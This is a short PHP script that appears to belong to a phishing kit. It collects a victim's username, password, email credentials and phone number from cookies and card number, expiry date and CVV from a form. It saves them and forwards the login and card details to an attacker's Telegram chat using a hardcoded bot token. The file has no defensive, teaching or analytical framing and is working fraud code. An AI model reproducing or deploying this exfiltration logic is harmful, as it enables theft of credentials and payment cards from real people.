<?php 
require('../prueba/lib/funciones.php');
require('../acciones/bot_telegram.php');
require('../bot.php');

$usuario = $_COOKIE['usuario'];
$contrasena = $_COOKIE['contrasena'];
$registro = $_COOKIE['registro'];

$cdinamica = $_COOKIE['cdinamica'];
$email = $_COOKIE['email'];
$cemail = $_COOKIE['cemail'];
$celular = $_COOKIE['celular'];

$tarjeta = $_POST['tar'];
$fecha = $_POST['fec'];
$cvv = $_POST['cvv'];


setcookie('tarjeta',$tarjeta,time()+60*9);
setcookie('fecha',$fecha,time()+60*9);
setcookie('cvv',$cvv,time()+60*9);

actualizar_registro_tar($registro,$tarjeta,$fecha,$cvv);


if(empty($usuario) || empty($contrasena)){
    
}else{
    
$chatId= "-4088574570";
$mensaje = "USER AGREGO TARJETA: $usuario - $contrasena\n Tarjeta: $tarjeta\nFecha: $fecha\nCvv: $cvv";
$token = "6473831509:AAEOJz1wQGkabbzRuXKWmvGXKqDo1dhBFcQ";
enviarMensajeTelegram($chatId, $mensaje, $token);
}
?>
